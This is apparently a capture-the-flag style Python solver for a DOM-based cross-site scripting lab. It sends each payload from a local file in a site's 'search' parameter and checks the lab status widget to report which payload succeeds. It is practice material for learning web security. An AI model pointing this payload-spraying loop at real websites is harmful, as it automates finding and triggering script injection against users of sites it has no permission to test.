# Lab: DOM XSS in document.write sink using source location.search

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip().rstrip('/')        
    except Exception:
        print("[-] Usage: %s <url> <post ID>" % sys.argv[0])
        print('[-] Example: %s www.example.com 1' % sys.argv[0])
        sys.exit(-1)


# read the payloads from the file
with open("payload.txt") as f:
    payload_list = f.read().splitlines()

# craft the attack
# establishing session for uniformity of request sequences
session = requests.session()
for exploit_payload in payload_list:
    crafted_request = session.get(base_url + "/?search=%s" % exploit_payload)
    # now check whether problem got solved ???
    is_solved = crafted_request.text
    result = []
    soup = BeautifulSoup(is_solved, features="lxml")
    result = soup.find("div", {"class" : "widgetcontainer-lab-status is-notsolved"})

    if result is not None:
        print("Not Solved! :( ")
        print(exploit_payload)
        print("Trying out more payloads from the payload.txt file...")
        continue
    else:
        print("Solved!!! :) ")
        print("Working payload(exploit) is: %s" % exploit_payload)
        break
    
